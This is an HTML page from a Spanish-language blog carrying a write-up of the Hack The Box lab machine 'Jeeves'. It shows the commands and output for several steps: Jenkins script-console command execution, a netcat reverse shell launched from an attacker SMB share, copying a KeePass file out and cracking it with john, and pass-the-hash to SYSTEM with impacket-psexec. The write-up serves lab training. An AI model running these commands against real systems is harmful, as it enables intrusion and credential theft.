@@ -1,0 +1,779 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Jeeves HTB Write-up - grafis Blog</title>
+<meta name="description" content="En este artículo comparto el write up de la máquina Jeeves de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="grafis Blog">
+<meta property="og:title" content="Jeeves HTB Write-up">
+<meta property="og:url" content="http://localhost:4000/Jeeves/">
+
+
+  <meta property="og:description" content="En este artículo comparto el write up de la máquina Jeeves de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/imagenes/Jeeves/jeeves_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-02-10T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/Jeeves/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "grafis",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="grafis Blog Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Jeeves HTB Write-up</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="grafis" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">grafis</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Estudiante de Ingeniería Civil en Informática y Telecomunicaciones
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/mirko-babic-velásquez-4979bb219" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/grafis0" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Jeeves HTB Write-up">
+    <meta itemprop="description" content="En este artículo comparto el write up de la máquina Jeeves de Hack The Box">
+    <meta itemprop="datePublished" content="February 10, 2023">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Jeeves HTB Write-up
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2023-02-10T00:00:00-05:00">February 10, 2023 </time>&emsp;
+          
+          
+        </p>
+        <p align="center">
+<img src="/imagenes/Jeeves/Jeeves_banner.png" width="550" height="250" />
+</p>
+
+<h1 id="resumen"><a href="#header-2"></a>Resumen</h1>
+
+<p>Saludos, en esta oportunidad vamos a resolver la máquina de <strong>Hack The Box</strong> llamada <strong>Jeeves</strong>, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:</p>
+
+<ul>
+  <li>Fuzzing a un IIS.</li>
+  <li>Utilización de la consola de jenkins para ganar acceso al sistema.</li>
+  <li>Obtención credenciales a través de archivo .kdbx.</li>
+  <li>Pass the hash.</li>
+</ul>
+
+<h2 id="reconocimiento-y-enumeración"><a href="#header-2"></a>Reconocimiento y Enumeración</h2>
+
+<p>En primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando <code class="language-plaintext highlighter-rouge">ping</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.63
+
+PING 10.10.10.63 (10.10.10.63) 56(84) bytes of data.
+64 bytes from 10.10.10.63: icmp_seq=1 ttl=127 time=138 ms
+</code></pre></div></div>
+<p>Se observa que existe una correcta conexión con la máquina.</p>
+
+<p>Para realizar un reconocimiento activo se utilizará la herramienta <code class="language-plaintext highlighter-rouge">nmap</code>, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro <code class="language-plaintext highlighter-rouge">-sS</code> el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap --open -sS -p- -min-rate 5000 -n -Pn 10.10.11.108 -oG ports
+</code></pre></div></div>
+<p>Al finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE
+80/tcp    open  http
+135/tcp   open  msrpc
+445/tcp   open  microsoft-ds
+50000/tcp open  ibm-db2
+</code></pre></div></div>
+<p>Realizamos un escaneo de los servicios expuestos utilizando <code class="language-plaintext highlighter-rouge">nmap</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sCV -p80,135,445,50000 10.10.10.63 -oN ServiceScan
+</code></pre></div></div>
+
+<p>Como resultado del escaneo tenemos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Ask Jeeves
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp   open  msrpc        Microsoft Windows RPC
+445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
+|_http-server-header: Jetty(9.4.z-SNAPSHOT)
+|_http-title: Error 404 Not Found
+Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 4h59m58s, deviation: 0s, median: 4h59m58s
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2023-02-11T02:09:58
+|_  start_date: 2023-02-11T02:00:02
+</code></pre></div></div>
+
+<p>En primer lugar, se observa el puerto <code class="language-plaintext highlighter-rouge">445</code> abierto, el cual corresponde al servicio <code class="language-plaintext highlighter-rouge">smb</code>, por lo tanto, intentaremos realizar una enumeración del equipo y también si es posible de usuarios o recursos, para ello usaremos diferentes herramientas, la primera es <code class="language-plaintext highlighter-rouge">crackmapexec</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.63
+
+SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
+</code></pre></div></div>
+
+<p>Intentamos listar recursos compartidos mediante <code class="language-plaintext highlighter-rouge">smbmap</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap -H 10.10.10.63
+[!] Authentication error on 10.10.10.63
+</code></pre></div></div>
+
+<p>Pero necesitamos credenciales para poder listar contenido.</p>
+
+<p>Observamos que se tiene el puerto 80 con un servicio <strong>http</strong>, por lo tanto, utilizamos whatweb para enumerar información:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb 10.10.10.63
+http://10.10.10.63 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.63], Microsoft-IIS[10.0], Title[Ask Jeeves]
+</code></pre></div></div>
+
+<p>Observamos que corresponde a un IIS, sin embargo, nada adicional que no nos reporte nmap, por lo tanto, iremos al navegador para ver qué encontramos:</p>
+
+<p><img src="/imagenes/Jeeves/jeeves.png" alt="" /></p>
+
+<p>Tenemos una página, sin embargo, al ingresar un imput nos redirige a una página de error, si vemos el código fuente observamos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Ask Jeeves&lt;/title&gt;
+&lt;link rel="stylesheet" type="text/css" href="style.css"&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+&lt;form class="form-wrapper cf" action="error.html"&gt;
+    &lt;div class="byline"&gt;&lt;p&gt;&lt;a href="#"&gt;Web&lt;/a&gt;, &lt;a href="#"&gt;images&lt;/a&gt;, &lt;a href="#"&gt;news&lt;/a&gt;, and &lt;a href="#"&gt;lots of answers&lt;/a&gt;.&lt;/p&gt;&lt;/div&gt;
+  	&lt;input type="text" placeholder="Search here..." required&gt;
+	  &lt;button type="submit"&gt;Search&lt;/button&gt;
+    &lt;div class="byline-bot"&gt;Skins&lt;/div&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre></div></div>
+
+<p>Hace un <strong>action</strong> hacia la página de error, por lo tanto, esta web no hace nada.</p>
+
+<p>Obsevamos que está abierto el puerto 50000, lo cual es extraño, entraremos a ver que hay:</p>
+
+<p><img src="/imagenes/Jeeves/jeeves3.png" alt="" /></p>
+
+<p>Encontramos esta página, para descubrir directorios utilizaremos wfuzz:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 http://10.10.10.63:50000/FUZZ
+</code></pre></div></div>
+
+<p>Luego, obtenemos un directorio:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                           
+=====================================================================
+
+000041607:   302        0 L      0 W        0 Ch        "askjeeves" 
+</code></pre></div></div>
+
+<p>Ingresamos a este directorio para ver que hay:</p>
+
+<p><img src="/imagenes/Jeeves/jeeves4.png" alt="" /></p>
+
+<p>Encontramos un panel de jenkins, si nos fijamos bien existe un área bastante interesante llamada <strong>Manage Jenkins</strong>, si entramos vemos lo siguiente:</p>
+
+<p><img src="/imagenes/Jeeves/jeeves5.png" alt="" /></p>
+
+<h2 id="explotación"><a href="#header-2"></a>Explotación</h2>
+
+<p>Encontramos algo muy interesante, se trata de la <strong>script console</strong>, la cual permite ejecutar scripts de forma arbitraria utilizando <strong>Groovy</strong>, si buscamos en la <a href="https://stackoverflow.com/questions/159148/groovy-executing-shell-commands">web</a> encontramos la siguiente forma de ingresar comandos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>println "whoami".execute().text
+
+Result
+
+jeeves\kohsuke
+</code></pre></div></div>
+
+<p>Observamos que podemos ejectuar comandos correctamente, en este punto como es una máquina windows utilizaremos el <code class="language-plaintext highlighter-rouge">netcat.exe</code>, para transferirlo a la máquina víctima utilizaremos <code class="language-plaintext highlighter-rouge">impacket-smbserver</code>, para compartir el <code class="language-plaintext highlighter-rouge">netcat</code> y ejectuar una reverse shell en la máquina víctima:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-smbserver shares $(pwd) -smb2support
+
+Impacket v0.10.1.dev1+20230203.111903.32178de6 - Copyright 2022 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+</code></pre></div></div>
+<p>Teniendo el servidor smb compartiendo el archivo, dentro de jenkins intentaremos acceder al <code class="language-plaintext highlighter-rouge">netcat</code> y ejectuarlo:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>println "\\10.10.14.17\shares\nc.exe -e cmd 10.10.14.17 1234".execute().text
+</code></pre></div></div>
+
+<p>Sin embargo, esto falla debido a que el <strong>backslash</strong> se utiliza para escapar caracteres, entonces haremos uso de doble <strong>backslash</strong>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>println "\\\\10.10.14.17\\shares\\nc.exe -e cmd 10.10.14.17 1234".execute().text
+</code></pre></div></div>
+
+<p>Si observamos el servidor <strong>smb</strong>, hemos recibido una conexión y si revimos nuestro <code class="language-plaintext highlighter-rouge">netcat</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.17] from (UNKNOWN) [10.10.10.63] 49684
+Microsoft Windows [Version 10.0.10586]
+(c) 2015 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator\.jenkins&gt;whoami
+whoami
+jeeves\kohsuke
+</code></pre></div></div>
+
+<p>Hemos conseguido entrar al sistema como el usuario <strong>kohsuke</strong>, ahora buscaremos la flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\kohsuke\Desktop&gt;type user.txt
+type user.txt
+e3232272596fb47950d59c4
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios"><a href="#header-2"></a>Escalada de privilegios</h2>
+
+<p>Si vamos abriendo las distintas carpetas del usuario <strong>kohsuke</strong>, encontramos lo siguiente:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Directory of C:\Users\kohsuke\Documents
+
+11/03/2017  10:18 PM    &lt;DIR&gt;          .
+11/03/2017  10:18 PM    &lt;DIR&gt;          ..
+09/18/2017  12:43 PM             2,846 CEH.kdbx
+               1 File(s)          2,846 bytes
+               2 Dir(s)   2,642,771,968 bytes free
+</code></pre></div></div>
+
+<p>Encontramos un archivo .kdbx que corresponde a la extensión de <strong>keepass</strong>, podríamos sacar contraseñas con esto asi que lo traeremos a nuestro equipo a través del smb:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\kohsuke\Documents&gt;copy C:\Users\kohsuke\Documents\CEH.kdbx \\10.10.14.17\shares
+copy C:\Users\kohsuke\Documents\CEH.kdbx \\10.10.14.17\shares
+        1 file(s) copied.
+</code></pre></div></div>
+<p>De esta forma tenemos el archivo en nuestro equipo. Utilizando la herramienta <code class="language-plaintext highlighter-rouge">keepassxc</code> abrimos este archivo:</p>
+
+<p><img src="/imagenes/Jeeves/jeeves6.png" alt="" /></p>
+
+<p>Pero este archivo está protegido por contraseña, para intentar obtenerla utilizaremos <code class="language-plaintext highlighter-rouge">keepass2john</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>keepass2john CEH.kdbx
+CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
+</code></pre></div></div>
+
+<p>Este hash lo intentamos romper con <code class="language-plaintext highlighter-rouge">john</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 6000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:25 0.13% (ETA: 01:53:10) 0g/s 865.8p/s 865.8c/s 865.8C/s kameron1..ilovepeter
+0g 0:00:00:32 0.16% (ETA: 01:55:02) 0g/s 862.4p/s 862.4c/s 862.4C/s 101203..060306
+moonshine1       (CEH)     
+1g 0:00:01:08 DONE (2023-02-10 20:21) 0.01456g/s 800.5p/s 800.5c/s 800.5C/s nando1..moonshine1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre></div></div>
+
+<p>Tenemos que la contraseña es <strong>moonshine1</strong>, vamos a keepass y la introducimos:</p>
+
+<p><img src="/imagenes/Jeeves/jeeves7.png" alt="" /></p>
+
+<p>Hemos entrado, si empezamos a revisar de arriba a abajo, encontramos esto:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+</code></pre></div></div>
+
+<p>Debido a la forma que tiene corresponde a un hash <strong>NTLM</strong>, si utilizamos el LM podriamos ser capaces de realizar un pass the hash, sin embargo, vamos a verificar con <code class="language-plaintext highlighter-rouge">crackmapexec</code> si esto es válido:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.63 -u'Administrator' -H 'e0fb1fb85756c24235ff238cbe81fe00'
+
+SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
+SMB         10.10.10.63     445    JEEVES           [+] Jeeves\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
+</code></pre></div></div>
+
+<p>Observamos que si es correcto, entonces podemos hacer uso de la utilidad <code class="language-plaintext highlighter-rouge">impacket-psexec</code> para hacer pass the hash:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-psexec WORKGROUP/Administrator@10.10.10.63 -hashes :e0fb1fb85756c24235ff238cbe81fe00
+Impacket v0.10.1.dev1+20230203.111903.32178de6 - Copyright 2022 Fortra
+
+[*] Requesting shares on 10.10.10.63.....
+[*] Found writable share ADMIN$
+[*] Uploading file AJsKtBPE.exe
+[*] Opening SVCManager on 10.10.10.63.....
+[*] Creating service TxXq on 10.10.10.63.....
+[*] Starting service TxXq.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.10586]
+(c) 2015 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt; whoami
+nt authority\system
+</code></pre></div></div>
+
+<p>Observamos que hemos ganado acceso al sistema como administrador, ahora buscaremos la flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Administrator\Desktop&gt; type hm.txt
+The flag is elsewhere.  Look deeper.
+</code></pre></div></div>
+<p>Encontramos este mensaje, nos hace pensar que hay información oculta, como en linux pueden existir carpetas que no podemos ver a priori, en windows se llaman ADS, alternative data streams:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Administrator\Desktop&gt; dir /r /s
+ Volume in drive C has no label.
+ Volume Serial Number is 71A1-6FA1
+
+ Directory of C:\Users\Administrator\Desktop
+
+11/08/2017  09:05 AM    &lt;DIR&gt;          .
+11/08/2017  09:05 AM    &lt;DIR&gt;          ..
+12/24/2017  02:51 AM                36 hm.txt
+                                    34 hm.txt:root.txt:$DATA
+11/08/2017  09:05 AM               797 Windows 10 Update Assistant.lnk
+               2 File(s)            833 bytes
+
+     Total Files Listed:
+               2 File(s)            833 bytes
+               2 Dir(s)   2,641,616,896 bytes free
+</code></pre></div></div>
+
+<p>Observamos que existe el archivo hm.txt:root.txt, entonces utilizando more podemos ver el contenido:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Administrator\Desktop&gt; more &lt; hm.txt:root.txt
+afbc5bd4b615a60648c
+</code></pre></div></div>
+
+<p>¡Bien!</p>
+
+<p>Hemos ganado acceso como administrador.</p>
+
+<p>Nos vemos, hasta la próxima.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#enumeration" class="page__taxonomy-item" rel="tag">Enumeration</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#fuzzing" class="page__taxonomy-item" rel="tag">Fuzzing</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#jenkins" class="page__taxonomy-item" rel="tag">Jenkins</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#kdbx" class="page__taxonomy-item" rel="tag">kdbx</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pass-the-hash" class="page__taxonomy-item" rel="tag">Pass the hash</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">Web</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#hack-the-box" class="page__taxonomy-item" rel="tag">Hack The Box</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#windows" class="page__taxonomy-item" rel="tag">Windows</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#write-up" class="page__taxonomy-item" rel="tag">Write up</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2023-02-10T00:00:00-05:00">February 10, 2023</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/Horizontall/" class="pagination--pager" title="Horizontall HTB Write-up
+">Previous</a>
+    
+    
+      <a href="/Love/" class="pagination--pager" title="Love HTB Write-up
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2023 grafis</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
